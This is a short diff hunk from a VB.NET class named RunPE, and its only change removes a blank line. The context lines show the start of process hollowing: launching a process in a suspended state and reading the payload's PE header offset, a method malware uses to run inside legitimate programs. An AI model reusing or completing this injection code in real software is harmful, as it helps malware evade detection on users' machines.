@@ -135,7 +135,6 @@ Class RunPE
             If Not String.IsNullOrEmpty(cmd) Then
                 QuotedPath = QuotedPath & " " & cmd
             End If
-
             If Not CreateProcess(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, SI, PI) Then Throw New Exception()
 
             Dim FileAddress As Integer = BitConverter.ToInt32(data, 60)
